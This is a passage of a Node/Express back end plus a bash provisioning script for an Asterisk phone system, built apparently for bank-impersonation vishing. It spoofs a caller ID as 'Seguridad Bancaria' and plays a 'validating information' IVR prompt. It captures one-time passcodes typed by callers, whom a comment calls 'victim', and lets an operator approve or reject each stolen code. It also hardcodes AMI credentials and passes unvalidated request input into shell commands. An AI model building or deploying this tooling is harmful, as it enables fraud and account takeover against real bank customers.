asterisk -rx 'database put ivr_vars 16104803845_wait custom/un_momento_validando_informacion' || true

asterisk -rx 'database put extension_cid 1001/number "+18005550199"' || true
asterisk -rx 'database put extension_cid 1001/name "Seguridad Bancaria"' || true

echo "=== [5/5] Recargando Dialplan y PJSIP en caliente ==="
asterisk -rx 'dialplan reload'
asterisk -rx 'pjsip reload'

echo ""
echo "=========================================================="
echo " ¡SINCRONIZACION EXITOSA CON ASTERISK!"
echo " 1. Dialplan /etc/asterisk/extensions.conf cargado."
echo " 2. Eliminado 'Anonymous' con subrutina pre-dial de PJSIP."
echo " 3. Audios de IVR activos en /var/lib/asterisk/sounds/custom/."
echo " 4. Flujo OTP configurado para validacion manual del asesor."
echo " Puedes probar marcando 8888 desde el softphone o desde la web."
echo "=========================================================="
`;

  res.setHeader('Content-Type', 'text/x-shellscript');
  res.send(bashScript);
});

// In-memory buffer for captured OTPs in production
interface CapturedOtpItem {
  id: string;
  number: string;
  otp: string;
  timestamp: string;
  channel?: string;
  service?: string;
  status: 'valid' | 'invalid' | 'pending';
}

let capturedOtpHistory: CapturedOtpItem[] = [];

// Endpoint to receive OTP captures from Asterisk curl or AMI
app.post('/api/asterisk/otp/capture', (req, res) => {
  const { number, otp, channel, service = 'Banco / Antifraude', status = 'pending' } = req.body;
  if (otp) {
    const cleanNumber = (number && number !== '<unknown>') ? String(number) : 'Destino Directo';
    const record: CapturedOtpItem = {
      id: 'otp-' + Date.now() + '-' + Math.random().toString(36).substring(2, 6),
      number: cleanNumber,
      otp: String(otp),
      timestamp: new Date().toLocaleTimeString(),
      channel: channel || 'PJSIP',
      service: service || 'Banco / Antifraude',
      status: (status === 'valid' || status === 'invalid') ? status : 'pending',
    };
    capturedOtpHistory.unshift(record);
    if (capturedOtpHistory.length > 300) capturedOtpHistory.pop();
    console.log(`[PRODUCCIÓN] ⭐ ¡NUEVO CÓDIGO OTP CAPTURADO (Esperando validación del agente)!: [${otp}] - Tel: ${cleanNumber}`);
  }
  res.json({ success: true, count: capturedOtpHistory.length });
});

// Endpoint for agent to decide if captured OTP is valid or invalid
app.post('/api/asterisk/otp/decision', async (req, res) => {
  try {
    const { id, otp, number, status, action } = req.body;
    if (!status || (status !== 'valid' && status !== 'invalid')) {
      return res.status(400).json({ success: false, error: 'El estado debe ser "valid" o "invalid"' });
    }

    if (id) {
      const match = capturedOtpHistory.find((r) => r.id === id);
      if (match) match.status = status;
    } else if (otp) {
      const match = capturedOtpHistory.find((r) => r.otp === otp);
      if (match) match.status = status;
    }

    if (number) {
      exec(`asterisk -rx 'database put otp_status "${number}" "${status}"'`, (err) => {
        if (err) console.warn('AstDB otp_status update notice:', err.message);
      });

      if (action === 'request_retry') {
        // Clear capture from AstDB so victim can enter new OTP
        exec(`asterisk -rx 'database del otp_captures "${number}"'`, () => {});
      }
    }

    console.log(`[DECISIÓN AGENTE] OTP ${otp || ''} para ${number || 'destino'} marcado como: [${status.toUpperCase()}]`);

    res.json({
      success: true,
      message: `Código marcado como ${status === 'valid' ? 'VÁLIDO (Aprobado)' : 'INVÁLIDO (Rechazado)'} por el agente.`,
      status,
    });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// Endpoint to list all captured OTP records
app.get('/api/asterisk/otp/records', (req, res) => {
  res.json({ success: true, records: capturedOtpHistory });
});

// Endpoint to delete/clear captured records
app.delete('/api/asterisk/otp/records', (req, res) => {
  capturedOtpHistory = [];
  res.json({ success: true });
});

// Endpoint to inspect live channels on Asterisk
app.get('/api/asterisk/live/channels', async (req, res) => {
  try {
    const amiOutput = await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [
      'core show channels concise',
    ]);
    res.json({ success: true, raw: amiOutput });
  } catch (err: any) {
    res.json({ success: false, raw: '', error: err.message });
  }
});

// Endpoint to hangup an active call
app.post('/api/asterisk/call/hangup', async (req, res) => {
  const { channel } = req.body;
  try {
    const cmd = channel ? `channel request hangup ${channel}` : 'channel request hangup all';
    await sendAmiAction('127.0.0.1', 5038, 'sammy', 'Robert2026RDTGcvgbsg', [cmd]);
    res.json({ success: true, message: `Canal ${channel || 'todos'} colgado` });
  } catch (err: any) {
    res.status(500).json({ success: false, error: err.message });
  }
});

// ==========================================
// VITE MIDDLEWARE (DEV) & STATIC FALLBACK (PROD)
// ==========================================

async function startServer() {
  if (process.env.NODE_ENV !== 'production' && !fs.existsSync(path.join(process.cwd(), 'dist', 'index.html'))) {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    // Cache static assets (JS, CSS, images, audio, webfonts) for 1 year immutable
    app.use('/assets', express.static(path.join(distPath, 'assets'), {
      maxAge: '1y',
      immutable: true,
      etag: true,
    }));

    // Cache generic static public files
    app.use(express.static(distPath, {
      maxAge: '1h',
      etag: true,
    }));

    // SPA fallback: index.html should revalidate so updates are immediate
    app.get('*', (req, res) => {
      res.setHeader('Cache-Control', 'no-cache, must-revalidate');
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Asterisk 20 Governor Server running on http://0.0.0.0:${PORT}`);
    // Auto-verify and provision default 8kHz audios on startup
    try {
      ensureCustomAudioFilesExist();
    } catch (e: any) {
      console.warn('Initial audio check warning:', e.message);
    }
  });
}

startServer();
